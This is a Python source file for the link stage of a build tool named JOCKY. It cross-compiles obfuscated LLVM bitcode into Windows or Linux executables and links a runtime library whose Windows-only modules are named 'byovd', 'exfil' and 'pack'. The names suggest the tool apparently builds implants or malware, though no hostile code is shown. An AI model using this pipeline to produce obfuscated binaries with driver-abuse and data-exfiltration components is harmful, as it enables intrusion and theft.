from jocky.core.stage import Stage
from jocky.core.context import BuildContext
from jocky.core.toolchain import discover_toolchain
from jocky.utils.subprocess import run_cmd
from pathlib import Path
import platform
import shutil

class LinkStage(Stage):
    @property
    def name(self) -> str:
        return "link"

    def run(self, ctx: BuildContext) -> BuildContext:
        tc = discover_toolchain()
        obf_bc = ctx.state["llvm_obf_bc"]
        out_dir = ctx.get_stage_output_dir(self.name)

        target = ctx.config.get("target") or ctx.state.get("target") or platform.system().lower()
        target = target.lower()
        if target in ("win", "windows", "win32"):
            target_os = "windows"
        else:
            target_os = "linux"

        # Determine output executable path
        if ctx.config.get("output"):
            output = Path(ctx.config["output"])
        else:
            suffix = ".exe" if target_os == "windows" else ""
            output = ctx.output_dir / f"{ctx.input_file.stem}{suffix}"

        obj_path = out_dir / "output.o"

        if target_os == "windows":
            # Compile bitcode to Windows COFF object file
            run_cmd([
                str(tc.clang()), "--target=x86_64-pc-windows-gnu", "-c", str(obf_bc), "-o", str(obj_path)
            ], "Bitcode to Windows object")

            runtime_lib = self._build_runtime_library(tc, out_dir, target_os)

            # Use clang cross-linker for Windows (MinGW path)
            mingw_lib = "/usr/x86_64-w64-mingw32/lib"
            link_cmd = [
                str(tc.clang()), "--target=x86_64-pc-windows-gnu",
                f"-L{mingw_lib}", str(obj_path), str(runtime_lib),
                "-lkernel32", "-luser32", "-ladvapi32", "-lws2_32", "-lwinhttp", "-lwininet", "-ldnsapi",
                "-lpsapi", "-lwevtapi", "-lssl", "-lcrypto", "-lz",
                "-o", str(output)
            ]
            run_cmd(link_cmd, "Linking Windows PE executable (clang)")
        else:
            # Linux target
            run_cmd([
                str(tc.clang()), "--target=x86_64-pc-linux-gnu", "-c", str(obf_bc), "-o", str(obj_path)
            ], "Bitcode to Linux object")

            runtime_lib = self._build_runtime_library(tc, out_dir, target_os)

            link_cmd = [
                str(tc.clang()), "--target=x86_64-pc-linux-gnu", str(obj_path), str(runtime_lib),
                "-lcurl", "-lcrypto", "-lz", "-lssl", "-lm", "-ldl",
                "-o", str(output)
            ]
            run_cmd(link_cmd, "Linking Linux ELF executable")

        ctx.state["executable"] = output
        ctx.state["object_file"] = obj_path
        return ctx

    def _find_lld_link(self) -> Path:
        """Locate lld-link binary on the system or in toolchain."""
        for candidate in ["lld-link-21", "lld-link-22", "lld-link"]:
            p = shutil.which(candidate)
            if p:
                return Path(p)
        return None

    def _parse_cmake_sources(self, runtime_dir: Path) -> list:
        """Parse CMakeLists.txt and extract RUNTIME_SOURCES list."""
        cmake_file = runtime_dir / "CMakeLists.txt"
        if not cmake_file.exists():
            return []

        sources = []
        content = cmake_file.read_text()
        in_sources = False

        for line in content.split('\n'):
            line = line.strip()
            if 'set(RUNTIME_SOURCES' in line:
                in_sources = True
                continue
            if in_sources:
                if line.startswith(')'):
                    break
                if line and not line.startswith('#'):
                    source_path = line.rstrip()
                    sources.append(source_path)

        return sources

    def _filter_sources_for_platform(self, sources: list, runtime_dir: Path, target_os: str) -> list:
        """Filter CMakeLists sources for the target platform."""
        # Files/folders that are Windows-only (from CMakeLists.txt REMOVE_ITEM for Linux)
        windows_only_prefixes = {"windows", "byovd", "exfil", "pack"}

        filtered = []
        for src in sources:
            src_path = runtime_dir / src
            filename = src.split('/')[-1].lower()

            # Check if filename contains platform indicators
            if "linux" in filename and target_os == "windows":
                continue
            if "windows" in filename and target_os == "linux":
                continue

            # Platform filtering logic - check first path component
            parts = src.split('/')
            is_windows_only = parts[0] in windows_only_prefixes
            is_linux_only = parts[0] == "linux"

            if is_windows_only and target_os != "windows":
                continue
            if is_linux_only and target_os != "linux":
                continue

            filtered.append(src_path)

        return [s for s in filtered if s.exists()]

    def _build_runtime_library(self, tc, out_dir: Path, target_os: str) -> Path:
        """Build the JOCKY runtime library using CMake and return path to libjocky_rt.a."""
        import subprocess
        import os

        script_dir = Path(__file__).parent.parent.parent.parent
        runtime_dir = script_dir / "src" / "runtime"
        if not runtime_dir.exists():
            raise RuntimeError(f"Runtime directory not found: {runtime_dir}")

        if target_os == "windows":
            return self._build_runtime_windows(tc, out_dir, runtime_dir)

        cmake_build_dir = out_dir / "cmake_build_linux"
        cmake_build_dir.mkdir(parents=True, exist_ok=True)

        cmake_cmd = [
            "cmake",
            "-S", str(runtime_dir),
            "-B", str(cmake_build_dir),
            "-DCMAKE_BUILD_TYPE=Release",
        ]

        try:
            run_cmd(cmake_cmd, "Configure JOCKY runtime with CMake")
        except Exception:
            pass

        build_cmd = ["cmake", "--build", str(cmake_build_dir), "-j4"]
        run_cmd(build_cmd, f"Build JOCKY runtime library ({target_os})")

        runtime_lib = cmake_build_dir / "libjocky_rt.a"
        if not runtime_lib.exists():
            raise RuntimeError(f"Runtime library not found after build: {runtime_lib}")

        return runtime_lib

    def _build_runtime_windows(self, tc, out_dir: Path, runtime_dir: Path) -> Path:
        """Compile JOCKY runtime for Windows using clang cross-compiler."""
        import os
        obj_dir = out_dir / "cmake_build_windows"
        obj_dir.mkdir(parents=True, exist_ok=True)

        sources = self._parse_cmake_sources(runtime_dir)
        sources = self._filter_sources_for_platform(sources, runtime_dir, "windows")

        mingw_inc = "/usr/x86_64-w64-mingw32/include"
        include_dirs = [
            str(runtime_dir / "include"),
            str(runtime_dir),
            mingw_inc,
        ]
        include_flags = [f"-I{d}" for d in include_dirs]

        clang = str(tc.clang())
        obj_files = []
        for src in sources:
            rel = src.relative_to(runtime_dir)
            obj_name = str(rel).replace("/", "_").replace("\\", "_") + ".o"
            obj_path = obj_dir / obj_name
            compile_cmd = [
                clang,
                "--target=x86_64-pc-windows-gnu",
                "-O1", "-c",
                "-D_WIN32", "-DWIN32",
                "-D_WIN32_WINNT=0x0600",
                "-Wno-implicit-function-declaration",
                "-Wno-incompatible-pointer-types",
            ] + include_flags + [str(src), "-o", str(obj_path)]
            try:
                run_cmd(compile_cmd, f"Compile {rel}")
                obj_files.append(str(obj_path))
            except Exception:
                pass

        if not obj_files:
            raise RuntimeError("No Windows runtime object files compiled")

        lib_path = obj_dir / "libjocky_rt.a"
        ar = shutil.which("llvm-ar") or shutil.which("ar") or "ar"
        run_cmd([ar, "rcs", str(lib_path)] + obj_files, "Archive Windows runtime")

        return lib_path

